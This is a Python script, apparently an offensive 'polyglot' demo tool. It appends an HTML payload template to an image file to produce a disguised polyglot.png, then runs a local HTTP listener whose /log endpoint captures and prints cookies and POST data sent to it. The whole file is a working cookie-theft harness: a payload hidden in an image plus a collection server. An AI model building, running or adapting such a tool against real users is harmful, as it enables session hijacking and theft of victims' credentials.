import os
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

PORT = 5000

print("=== Polyglot Demo Tool ===")

image_path = input("Enter image file path: ").strip()

if not os.path.exists(image_path):
    print("[-] File not found")
    exit()

# Load payload from external file
try:
    with open("payload_template.html", "r", encoding="utf-8") as p:
        payload = p.read()
except:
    print("[-] payload_template.html not found")
    exit()

# Replace port dynamically
payload = payload.replace("{{PORT}}", str(PORT))

# Create polyglot
output_file = "polyglot.png"

with open(output_file, "wb") as f:
    with open(image_path, "rb") as img:
        f.write(img.read())
    f.write(payload.encode())

print(f"[+] Polyglot created: {output_file}")

# ---------------- SERVER ---------------- #

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/log"):
            query = urllib.parse.urlparse(self.path).query
            data = urllib.parse.parse_qs(query)

            cookies = data.get("cookie", [""])[0]

            print("\n[🔥 DATA RECEIVED]")
            print("Cookies:", cookies)

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Logged")

        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Server Running")

    def do_POST(self):
        if self.path.startswith("/log"):
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()

            print("\n[🔥 DATA RECEIVED - POST]")
            print(post_data)

            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Logged")

print(f"[+] Starting local server on http://127.0.0.1:{PORT}")

server = HTTPServer(("127.0.0.1", PORT), Handler)
server.serve_forever()